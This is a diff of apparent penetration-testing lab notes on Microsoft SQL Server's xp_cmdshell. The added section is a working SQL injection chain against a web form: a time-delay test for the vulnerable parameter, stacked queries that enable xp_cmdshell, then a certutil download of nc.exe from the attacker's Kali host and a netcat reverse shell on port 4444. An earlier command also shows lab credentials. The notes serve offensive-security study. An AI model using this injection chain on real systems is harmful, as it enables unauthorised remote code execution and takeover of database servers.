@@ -528,7 +528,7 @@ Depends on OS, service privileges, & filesystem permissions.
 - Takes a string and passes it to a cmd shell for execution.  Function returns any output as rows of text
 	- Disabled by default and must be called w/ the **EXECUTE** keyword instead of SELECT
 
-##### Enabling *xp_cmdshell*
+##### Enabling *xp_cmdshell* in Linux
 ```bash
 impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
 	Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
@@ -545,6 +545,29 @@ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
 		nt service\mssql$sqlexpress
 		
 		NULL
+```
+
+##### Enabling *xp_cmdshell* in Web Form
+```sql
+-- Test for vuln param
+'; WAITFOR delay '0:0:10';-- 
+
+'-- Find out dbs version to find possible vulns
+-- Not working, not sure how to find possible vuln avenues - '; IF(CHARINDEX('15.0.',@@VERSION)>0) WAITFOR DELAY '0:0:15'--
+
+-- Copy Window's nc.exe to folder and create web server
+cp /usr/share/windows-resources/binaries/nc.exe ~/exercises/web 
+python -m http.server 80
+
+-- Configure xp_cmdshell to work
+';EXEC sp_configure 'show advanced options', 1;--
+';RECONFIGURE;--
+';EXEC sp_configure "xp_cmdshell", 1;--
+';RECONFIGURE;--
+
+-- Download nc.exe to target maching & run
+';EXEC xp_cmdshell "certutil -urlcache -f http://<kali_ip>/nc.exe c:/windows/temp/nc.exe";-- '
+';EXEC xp_cmdshell "c:/windows/temp/nc.exe <kali_ip> 4444 -e cmd.exe";--
 ```
 
 
